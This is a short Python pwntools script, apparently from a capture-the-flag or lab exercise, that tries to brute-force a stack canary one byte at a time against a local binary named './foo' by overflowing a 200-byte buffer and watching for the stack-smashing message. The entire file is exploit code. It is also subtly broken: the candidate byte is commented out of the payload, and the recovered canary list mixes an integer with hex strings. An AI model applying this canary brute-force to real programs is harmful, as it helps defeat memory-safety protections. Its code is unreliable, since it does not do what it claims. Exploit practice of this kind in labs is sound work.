from operator import index
from pwn import *
import pwn
from struct import pack
import sys
import subprocess as proc
pwn.log.info=False
padding = b'A'*200+b"\x00"
cookie = [0x00]
indx = 0
while indx<3:
	#print(f"[+] Trying Byte {bt+2}")
	for i in range(1,256,1):
		byte = p8(i)
		payload = padding #+byte
		val = process("./foo")
		val.sendline(payload)
		res = val.recvall()
		#print(res)
		if "***" not in res.decode():
			padding+= byte
			open("pad.bin","wb").write(padding)
			cookie.append(hex(i))
			print(indx)
			input(res.decode())
			indx+=1
			break
print(cookie)